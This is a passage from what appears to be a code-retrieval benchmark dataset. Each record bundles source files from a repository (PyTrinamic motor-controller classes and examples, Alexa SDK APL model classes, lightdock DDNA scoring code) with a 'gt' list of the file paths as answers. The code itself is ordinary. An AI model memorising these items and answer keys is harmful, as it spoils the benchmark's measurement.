            = 189\n            PIDIN_TARGET_FLUX              = 191\n            TargetVelocity                 = 192\n\n            DebugMaxVelocity               = 240\n            DebugMaxAcceleration           = 241\n            DebugTargetVelocity            = 242\n            DebugRampVelocity              = 243\n            DebugTargetPosition            = 244\n            DebugRampPosition              = 245\n\n            torqueMeasurementFactor        = 251\n            StartEncoderInitialization     = 252\n            EncoderInitState               = 253\n            ActualEncoderWaitTime          = 254\n\n'PyTrinamic/pytrinamic/features/digital_hall_module.py'\n:\n\n\n\n\n\n\n\nfrom ..features.digital_hall import DigitalHall\n\n\nclass DigitalHallModule(DigitalHall):\n\n    def __init__(self, module, axis, aps):\n        super().__init__(module, axis)\n        self._aps = aps\n        self._hasHallSensorDirection = False\n        self._hasHallSensorPolarity = False\n        self._hasHallSensorSectorOffset = False\n        self._hasHallSensorOffset = False\n        self._hasHallSensorInterpolation = False\n\n        if hasattr(self._aps, \"HallSensorDirection\"):\n            self._hasHallSensorDirection = True\n        if hasattr(self._aps, \"HallSensorPolarity\"):\n            self._hasHallSensorPolarity = True\n        if hasattr(self._aps, \"HallSensorSectorOffset\"):\n            self._hasHallSensorSectorOffset = True\n        if hasattr(self._aps, \"HallSensorOffset\"):\n            self._hasHallSensorOffset = True\n        if hasattr(self._aps, \"HallSensorInterpolation\"):\n            self._hasHallSensorInterpolation = True\n\n    def set_direction(self, direction):\n        if self._hasHallSensorDirection:\n            self._parent.set_axis_parameter(self._aps.HallSensorDirection, self._axis, direction)\n\n    def get_direction(self):\n        if self._hasHallSensorDirection:\n            return self._parent.get_axis_parameter(self._aps.HallSensorDirection, self._axis)\n        else:\n            return None\n\n    def set_polarity(self, invert):\n        if self._hasHallSensorPolarity:\n            self._parent.set_axis_parameter(self._aps.HallSensorPolarity, self._axis, invert)\n\n    def get_polarity(self):\n        if self._hasHallSensorPolarity:\n            return self._parent.get_axis_parameter(self._aps.HallSensorPolarity, self._axis)\n        else:\n            return None\n\n    def set_sector_offset(self, sector_offset):\n        if self._hasHallSensorSectorOffset:\n            self._parent.set_axis_parameter(self._aps.HallSensorSectorOffset, self._axis, sector_offset)\n\n    def get_sector_offset(self):\n        if self._hasHallSensorSectorOffset:\n            return self._parent.get_axis_parameter(self._aps.HallSensorSectorOffset, self._axis)\n        else:\n            return None\n\n    def set_offset(self, offset):\n        if self._hasHallSensorOffset:\n            self._parent.set_axis_parameter(self._aps.HallSensorOffset, self._axis, offset)\n\n    def get_offset(self):\n        if self._hasHallSensorOffset:\n            return self._parent.get_axis_parameter(self._aps.HallSensorOffset, self._axis)\n        else:\n            return None\n\n    def set_interpolation(self, enable_interpolation):\n        if self._hasHallSensorInterpolation:\n            self._parent.set_axis_parameter(self._aps.HallSensorInterpolation, self._axis, enable_interpolation)\n\n    def get_interpolation(self):\n        if self._hasHallSensorInterpolation:\n            return self._parent.get_axis_parameter(self._aps.HallSensorInterpolation, self._axis)\n        else:\n            return None\n\n\n    direction = property(get_direction, set_direction)\n    polarity = property(get_polarity, set_polarity)\n    sector_offset = property(get_sector_offset, set_sector_offset)\n    offset = property(get_offset, set_offset)\n    interpolation = property(get_interpolation, set_interpolation)\n\n    def __str__(self):\n        values = \"DigitalHall {\"\n        if self._hasHallSensorDirection:\n            values += \"'direction':\" + str(self.direction) + \", \"\n\n        if self._hasHallSensorPolarity:\n            values += \"'polarity':\" + str(self.polarity) + \", \"\n\n        if self._hasHallSensorSectorOffset:\n            values += \"'sector_offset':\" + str(self.sector_offset) + \", \"\n\n        if self._hasHallSensorOffset:\n            values += \"'offset':\" + str(self.offset) + \", \"\n\n        if self._hasHallSensorInterpolation:\n            values += \"'interpolation':\" + str(self.interpolation) + \", \"\n\n        values = values[:-2]\n        values += \"}\"\n        return values\n\n'PyTrinamic/pytrinamic/evalboards/TMC2160_eval.py'\n:\n\n\n\n\n\n\n\nfrom pytrinamic.evalboards import TMCLEval\nfrom pytrinamic.ic import TMC2160\nfrom pytrinamic.features import MotorControlModule\n\n\nclass TMC2160_eval(TMCLEval):\n\n    def __init__(self, connection, module_id=1):\n\n        TMCLEval.__init__(self, connection, module_id)\n        self.motors = [self._MotorTypeA(self, 0)]\n        self.ics = [TMC2160()]\n\n\n\n    def write_register(self, register_address, value):\n        return self._connection.write_drv(register_address, value, self._module_id)\n\n    def read_register(self, register_address, signed=False):\n        return self._connection.read_drv(register_address, self._module_id, signed)\n\n\n\n    def rotate(self, motor, value):\n        self._connection.rotate(motor, value)\n\n    def stop(self, motor):\n        self._connection.stop(motor)\n\n    def move_to(self, motor, position, velocity=None):\n        if velocity and velocity != 0:\n            self.motors[motor].set_axis_parameter(self.motors[motor].AP.MaxVelocity, velocity)\n        self._connection.move_to(motor, position, self._module_id)\n\n    def move_by(self, motor, distance, velocity=None):\n        if velocity and velocity != 0:\n            self.motors[motor].set_axis_parameter(self.motors[motor].AP.MaxVelocity, velocity)\n        self._connection.move_by(motor, distance, self._module_id)\n\n    class _MotorTypeA(MotorControlModule):\n        def __init__(self, eval_board, axis):\n            MotorControlModule.__init__(self, eval_board, axis, self.AP)\n\n        class AP:\n            TargetPosition                 = 0\n            ActualPosition                 = 1\n            TargetVelocity                 = 2\n            ActualVelocity                 = 3\n            MaxVelocity                    = 4\n            MaxAcceleration                = 5\n            MaxCurrent                     = 6\n            StandbyCurrent                 = 7\n            PositionReachedFlag            = 8\n            THIGH                          = 23\n            VDCMIN                         = 24\n            HighSpeedFullstepMode          = 26\n            HighSpeedChopperMode           = 27\n            internal_Rsense                = 28\n            MeasuredSpeed                  = 29\n            StepDirSource                  = 50\n            StepDirFrequency               = 51\n            MicrostepResolution            = 140\n            ChopperBlankTime               = 162\n            ConstantTOffMode               = 163\n            DisableFastDecayComparator     = 164\n            ChopperHysteresisEnd           = 165\n            ChopperHysteresisStart         = 166\n            TOff                           = 167\n            SEIMIN                         = 168\n            SECDS                          = 169\n            smartEnergyHysteresis          = 170\n            SECUS                          = 171\n            smartEnergyHysteresisStart     = 172\n            SG2FilterEnable                = 173\n            SG2Threshold                   = 174\n            VSense                         = 179\n            smartEnergyActualCurrent       = 180\n            smartEnergyStallVelocity       = 181\n            smartEnergyThresholdSpeed      = 182\n            RandomTOffMode                 = 184\n            ChopperSynchronization         = 185\n            PWMThresholdSpeed              = 186\n            PWMGrad                        = 187\n            PWMAmplitude                   = 188\n            PWMFrequency                   = 191\n            PWMAutoscale                   = 192\n            FreewheelingMode               = 204\n            LoadValue                      = 206\n\n'PyTrinamic/examples/evalboards/TMC4671/TMC4671_eval_BLDC_ABN_encoder.py'\n:\n\n\n\n\n\n\n\nimport time\nimport pytrinamic\nfrom pytrinamic.connections import ConnectionManager\nfrom pytrinamic.evalboards import TMC4671_eval\nfrom pytrinamic.ic import TMC4671\n\npytrinamic.show_info()\n\nwith ConnectionManager().connect() as my_interface:\n    print(my_interface)\n\n    if my_interface.supports_tmcl():\n\n        eval_board = TMC4671_eval(my_interface)\n        mc = eval_board.ics[0]\n    else:\n\n        mc = TMC4671(my_interface)\n\n        eval_board = mc\n\n\n\n\n    eval_board.write_register_field(mc.FIELD.MOTOR_TYPE, mc.ENUM.MOTOR_TYPE_BLDC)\n    eval_board.write_register_field(mc.FIELD.N_POLE_PAIRS, 4)\n    eval_board.write_register(mc.REG.PWM_POLARITIES, 0x00000000)\n    eval_board.write_register(mc.REG.PWM_MAXCNT, int(0x00000F9F))\n    eval_board.write_register(mc.REG.PWM_BBM_H_BBM_L, 0x00000A0A)\n    eval_board.write_register_field(mc.FIELD.PWM_CHOP, mc.ENUM.PWM_CENTERED_FOR_FOC)\n    eval_board.write_register_field(mc.FIELD.PWM_SV, 1)\n\n\n    eval_board.write_register(mc.REG.ADC_I_SELECT, 0x18000100)\n    eval_board.write_register(mc.REG.dsADC_MCFG_B_MCFG_A, 0x00100010)\n    eval_board.write_register(mc.REG.dsADC_MCLK_A, 0x20000000)\n    eval_board.write_register(mc.REG.dsADC_MCLK_B, 0x00000000)\n    eval_board.write_register(mc.REG.dsADC_MDEC_B_MDEC_A, int(0x014E014E))\n    eval_board.write_register(mc.REG.ADC_I0_SCALE_OFFSET, 0x01008218)\n    eval_board.write_register(mc.REG.ADC_I1_SCALE_OFFSET, 0x0100820A)\n\n\n\n\n    eval_board.write_register(mc.REG.ABN_DECODER_MODE, 0x00001000)\n    eval_board.write_register(mc.REG.ABN_DECODER_PPR, 4096)\n    eval_board.write_register(mc.REG.ABN_DECODER_PHI_E_PHI_M_OFFSET, 0)\n\n\n    eval_board.write_register(mc.REG.PID_TORQUE_FLUX_LIMITS, 1000)\n\n\n    eval_board.write_register(mc.REG.PID_TORQUE_P_TORQUE_I, 0x01000100)\n    eval_board.write_register(mc.REG.PID_FLUX_P_FLUX_I, 0x01000100)\n\n\n\n\n    print(\"Initializing Encoder...\")\n    eval_board.write_register(mc.REG.MODE_RAMP_MODE_MOTION, 0x00000008)\n    eval_board.write_register(mc.REG.ABN_DECODER_PHI_E_PHI_M_OFFSET, 0x00000000)\n    eval_board.write_register(mc.REG.PHI_E_SELECTION, mc.ENUM.PHI_E_EXTERNAL)\n    eval_board.write_register(mc.REG.PHI_E_EXT, 0x00000000)\n    eval_board.write_register(mc.REG.UQ_UD_EXT, 2000)\n    time.sleep(1)\n\n\n    eval_board.write_register(mc.REG.ABN_DECODER_COUNT, 0)\n\n\n    eval_board.write_register(mc.REG.PHI_E_SELECTION, mc.ENUM.PHI_E_ABN)\n    eval_board.write_register(mc.REG.VELOCITY_SELECTION, mc.ENUM.VELOCITY_PHI_M_ABN)\n\n\n    eval_board.write_register(mc.REG.MODE_RAMP_MODE_MOTION, mc.ENUM.MOTION_MODE_TORQUE)\n\n\n    print(\"Rotate right...\")\n    eval_board.write_register_field(mc.FIELD.PID_TORQUE_TARGET, 1000)\n    time.sleep(3)\n\n\n    print(\"Rotate left...\")\n    eval_board.write_register_field(mc.FIELD.PID_TORQUE_TARGET, -1000)\n    time.sleep(3)\n\n\n    print(\"Stop...\")\n    eval_board.write_register(mc.REG.PID_TORQUE_FLUX_TARGET, 0)\n\nprint(\"\\nReady.\")\n\n'PyTrinamic/pytrinamic/features/__init__.py'\n:from .abn_encoder_module import ABNEncoderModule\nfrom .absolute_encoder_module import AbsoluteEncoderModule\nfrom .digital_hall_module import DigitalHallModule\nfrom .drive_setting import DriveSetting\nfrom .drive_setting_module import DriveSettingModule\nfrom .linear_ramp_module import LinearRampModule\nfrom .motor_control_module import MotorControlModule\nfrom .pid_module import PIDModule\nfrom .stallguard2_module import StallGuard2Module\nfrom .coolstep_module import CoolStepModule\n\n'PyTrinamic/pytrinamic/evalboards/__init__.py'\n:from .tmcl_eval import TMCLEval\nfrom .MAX22216_eval import MAX22216_eval\nfrom .TMC2100_eval import TMC2100_eval\nfrom .TMC2130_eval import TMC2130_eval\nfrom .TMC2160_eval import TMC2160_eval\nfrom .TMC2208_eval import TMC2208_eval\nfrom .TMC2209_eval import TMC2209_eval\nfrom .TMC2224_eval import TMC2224_eval\nfrom .TMC2225_eval import TMC2225_eval\nfrom .TMC2240_eval import TMC2240_eval\nfrom .TMC2300_eval import TMC2300_eval\nfrom .TMC2590_eval import TMC2590_eval\nfrom .TMC2660_eval import TMC2660_eval\nfrom .TMC4361_eval import TMC4361_eval\nfrom .TMC4671_eval import TMC4671_eval\nfrom .TMC5031_eval import TMC5031_eval\nfrom .TMC5041_eval import TMC5041_eval\nfrom .TMC5062_eval import TMC5062_eval\nfrom .TMC5072_eval import TMC5072_eval\nfrom .TMC5130_eval import TMC5130_eval\nfrom .TMC5160_eval import TMC5160_eval\nfrom .TMC5160_shield import TMC5160_shield\nfrom .TMC5240_eval import TMC5240_eval\nfrom .TMC6100_eval import TMC6100_eval\nfrom .TMC6140_eval import TMC6140_eval\nfrom .TMC6200_eval import TMC6200_eval\nfrom .TMC6300_eval import TMC6300_eval\nfrom .TMC7300_eval import TMC7300_eval\nfrom .TMC5272_eval import TMC5272_eval\nfrom .TMC5271_eval import TMC5271_eval\nfrom .TMC5262_eval import TMC5262_eval\n",
        "gt": [
            "'PyTrinamic/pytrinamic/features/digital_hall_module.py'",
            "'PyTrinamic/pytrinamic/features/__init__.py'",
            "'PyTrinamic/pytrinamic/evalboards/TMC2160_eval.py'",
            "'PyTrinamic/pytrinamic/evalboards/__init__.py'",
            "'PyTrinamic/pytrinamic/evalboards/TMC4671_eval.py'",
            "'PyTrinamic/examples/evalboards/TMC4671/TMC4671_eval_BLDC_ABN_encoder.py'"
        ]
    },
    {
        "files": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_pager_tag.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_tags.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen.py'"
        ],
        "content": "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_pager_tag.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n\n\nclass ComponentVisibleOnScreenPagerTag(object):\n\n    deserialized_types = {\n        'index': 'int',\n        'page_count': 'int',\n        'allow_forward': 'bool',\n        'allow_backwards': 'bool'\n    }\n\n    attribute_map = {\n        'index': 'index',\n        'page_count': 'pageCount',\n        'allow_forward': 'allowForward',\n        'allow_backwards': 'allowBackwards'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, index=None, page_count=None, allow_forward=None, allow_backwards=None):\n\n\n        self.__discriminator_value = None\n\n        self.index = index\n        self.page_count = page_count\n        self.allow_forward = allow_forward\n        self.allow_backwards = allow_backwards\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, ComponentVisibleOnScreenPagerTag):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_tags.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_viewport_tag import ComponentVisibleOnScreenViewportTag as ComponentVisibleOnScreenViewportTag_fe01bdff\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_media_tag import ComponentVisibleOnScreenMediaTag as ComponentVisibleOnScreenMediaTag_21044cbd\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_pager_tag import ComponentVisibleOnScreenPagerTag as ComponentVisibleOnScreenPagerTag_c57e1bff\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_list_item_tag import ComponentVisibleOnScreenListItemTag as ComponentVisibleOnScreenListItemTag_9ab82632\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_scrollable_tag import ComponentVisibleOnScreenScrollableTag as ComponentVisibleOnScreenScrollableTag_29ddcc5f\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_list_tag import ComponentVisibleOnScreenListTag as ComponentVisibleOnScreenListTag_7f7ef87f\n\n\nclass ComponentVisibleOnScreenTags(object):\n\n    deserialized_types = {\n        'checked': 'bool',\n        'clickable': 'bool',\n        'disabled': 'bool',\n        'focused': 'bool',\n        'list': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_list_tag.ComponentVisibleOnScreenListTag',\n        'list_item': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_list_item_tag.ComponentVisibleOnScreenListItemTag',\n        'media': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_media_tag.ComponentVisibleOnScreenMediaTag',\n        'ordinal': 'int',\n        'pager': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_pager_tag.ComponentVisibleOnScreenPagerTag',\n        'scrollable': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_scrollable_tag.ComponentVisibleOnScreenScrollableTag',\n        'spoken': 'bool',\n        'viewport': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_viewport_tag.ComponentVisibleOnScreenViewportTag'\n    }\n\n    attribute_map = {\n        'checked': 'checked',\n        'clickable': 'clickable',\n        'disabled': 'disabled',\n        'focused': 'focused',\n        'list': 'list',\n        'list_item': 'listItem',\n        'media': 'media',\n        'ordinal': 'ordinal',\n        'pager': 'pager',\n        'scrollable': 'scrollable',\n        'spoken': 'spoken',\n        'viewport': 'viewport'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, checked=None, clickable=None, disabled=None, focused=None, list=None, list_item=None, media=None, ordinal=None, pager=None, scrollable=None, spoken=None, viewport=None):\n\n\n        self.__discriminator_value = None\n\n        self.checked = checked\n        self.clickable = clickable\n        self.disabled = disabled\n        self.focused = focused\n        self.list = list\n        self.list_item = list_item\n        self.media = media\n        self.ordinal = ordinal\n        self.pager = pager\n        self.scrollable = scrollable\n        self.spoken = spoken\n        self.viewport = viewport\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, ComponentVisibleOnScreenTags):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen import ComponentVisibleOnScreen as ComponentVisibleOnScreen_c94bf507\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_tags import ComponentVisibleOnScreenTags as ComponentVisibleOnScreenTags_2ad43cf6\n    from ask_sdk_model.interfaces.alexa.presentation.apl.component_entity import ComponentEntity as ComponentEntity_262ae12d\n\n\nclass ComponentVisibleOnScreen(object):\n\n    deserialized_types = {\n        'children': 'list[ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen.ComponentVisibleOnScreen]',\n        'entities': 'list[ask_sdk_model.interfaces.alexa.presentation.apl.component_entity.ComponentEntity]',\n        'id': 'str',\n        'position': 'str',\n        'tags': 'ask_sdk_model.interfaces.alexa.presentation.apl.component_visible_on_screen_tags.ComponentVisibleOnScreenTags',\n        'transform': 'list[float]',\n        'object_type': 'str',\n        'uid': 'str',\n        'visibility': 'float'\n    }\n\n    attribute_map = {\n        'children': 'children',\n        'entities': 'entities',\n        'id': 'id',\n        'position': 'position',\n        'tags': 'tags',\n        'transform': 'transform',\n        'object_type': 'type',\n        'uid': 'uid',\n        'visibility': 'visibility'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, children=None, entities=None, id=None, position=None, tags=None, transform=None, object_type=None, uid=None, visibility=None):\n\n\n        self.__discriminator_value = None\n\n        self.children = children\n        self.entities = entities\n        self.id = id\n        self.position = position\n        self.tags = tags\n        self.transform = transform\n        self.object_type = object_type\n        self.uid = uid\n        self.visibility = visibility\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, ComponentVisibleOnScreen):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n",
        "gt": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_pager_tag.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen_tags.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/alexa/presentation/apl/component_visible_on_screen.py'"
        ]
    },
    {
        "files": [
            "'lightdock/lightdock/test/scoring/test_ddna_function.py'",
            "'lightdock/lightdock/scoring/ddna/cython/__init__.py'",
            "'lightdock/lightdock/scoring/ddna/driver.py'"
        ],
        "content": "'lightdock/lightdock/test/scoring/test_ddna_function.py'\n:\n\nimport pytest\nfrom pathlib import Path\nfrom lightdock.scoring.ddna.driver import DDNA, DDNAAdapter\nfrom lightdock.pdbutil.PDBIO import parse_complex_from_file\nfrom lightdock.structure.complex import Complex\n\n\nclass TestDDNA:\n    def setup_class(self):\n        self.path = Path(__file__).absolute().parent\n        self.golden_data_path = self.path / \"golden_data\"\n        self.dna = DDNA()\n\n    def test_calculate_DNA_1AZP(self):\n        atoms, _, chains = parse_complex_from_file(\n            self.golden_data_path / \"1azp_prot.pdb\"\n        )\n        receptor = Complex(\n            chains, atoms, structure_file_name=(self.golden_data_path / \"1azp_prot.pdb\")\n        )\n        atoms, _, chains = parse_complex_from_file(\n            self.golden_data_path / \"1azp_dna.pdb\"\n        )\n        ligand = Complex(\n            chains, atoms, structure_file_name=(self.golden_data_path / \"1azp_dna.pdb\")\n        )\n        adapter = DDNAAdapter(receptor, ligand)\n        assert 6.915295143021656 == pytest.approx(\n            self.dna(\n                adapter.receptor_model,\n                adapter.receptor_model.coordinates[0],\n                adapter.ligand_model,\n                adapter.ligand_model.coordinates[0],\n            )\n        )\n\n'lightdock/lightdock/scoring/ddna/cython/__init__.py'\n:\n'lightdock/lightdock/scoring/ddna/driver.py'\n:\n\nimport os\n\nfrom lightdock.structure.model import DockingModel\nfrom lightdock.scoring.functions import ModelAdapter, ScoringFunction\nfrom lightdock.scoring.ddna.cython.cddna import calculate_ddna\nfrom lightdock.util.logger import LoggingManager\nfrom lightdock.constants import DEFAULT_CONTACT_RESTRAINTS_CUTOFF\nfrom lightdock.error.lightdock_errors import NotSupportedInScoringError\n\nlog = LoggingManager.get_logger(\"ddna\")\n\n\natom_map = {\n    \"CYS\": {\"N\": \"N.am\", \"CA\": \"C.3\", \"C\": \"C.2\", \"O\": \"O.2\", \"CB\": \"C.3\", \"SG\": \"S.3\"},\n    \"MET\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"SD\": \"S.3\",\n        \"CE\": \"C.3\",\n    },\n    \"PHE\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.ar\",\n        \"CD1\": \"C.ar\",\n        \"CD2\": \"C.ar\",\n        \"CE1\": \"C.ar\",\n        \"CE2\": \"C.ar\",\n        \"CZ\": \"C.ar\",\n    },\n    \"ILE\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG1\": \"C.3\",\n        \"CG2\": \"C.3\",\n        \"CD\": \"C.3\",\n        \"CD1\": \"C.3\",\n    },\n    \"LEU\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD1\": \"C.3\",\n        \"CD2\": \"C.3\",\n    },\n    \"VAL\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG1\": \"C.3\",\n        \"CG2\": \"C.3\",\n    },\n    \"TRP\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.2\",\n        \"CD1\": \"C.2\",\n        \"CD2\": \"C.ar\",\n        \"NE1\": \"N.pl3\",\n        \"CE2\": \"C.ar\",\n        \"CE3\": \"C.ar\",\n        \"CZ2\": \"C.ar\",\n        \"CZ3\": \"C.ar\",\n        \"CH2\": \"C.ar\",\n    },\n    \"TYR\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.ar\",\n        \"CD1\": \"C.ar\",\n        \"CD2\": \"C.ar\",\n        \"CE1\": \"C.ar\",\n        \"CE2\": \"C.ar\",\n        \"CZ\": \"C.ar\",\n        \"OH\": \"O.3\",\n    },\n    \"ALA\": {\"N\": \"N.am\", \"CA\": \"C.3\", \"C\": \"C.2\", \"O\": \"O.2\", \"CB\": \"C.3\"},\n    \"GLY\": {\"N\": \"N.am\", \"CA\": \"C.3\", \"C\": \"C.2\", \"O\": \"O.2\"},\n    \"THR\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"OG1\": \"O.3\",\n        \"CG2\": \"C.3\",\n    },\n    \"SER\": {\"N\": \"N.am\", \"CA\": \"C.3\", \"C\": \"C.2\", \"O\": \"O.2\", \"CB\": \"C.3\", \"OG\": \"O.3\"},\n    \"GLN\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD\": \"C.2\",\n        \"OE1\": \"O.2\",\n        \"NE2\": \"N.am\",\n    },\n    \"ASN\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.2\",\n        \"OD1\": \"O.2\",\n        \"ND2\": \"N.am\",\n    },\n    \"GLU\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD\": \"C.2\",\n        \"OE1\": \"O.co2\",\n        \"OE2\": \"O.co2\",\n    },\n    \"ASP\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.2\",\n        \"OD1\": \"O.co2\",\n        \"OD2\": \"O.co2\",\n    },\n    \"HIS\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.2\",\n        \"ND1\": \"N.pl3\",\n        \"CD2\": \"C.2\",\n        \"CE1\": \"C.2\",\n        \"NE2\": \"N.2\",\n    },\n    \"ARG\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD\": \"C.3\",\n        \"NE\": 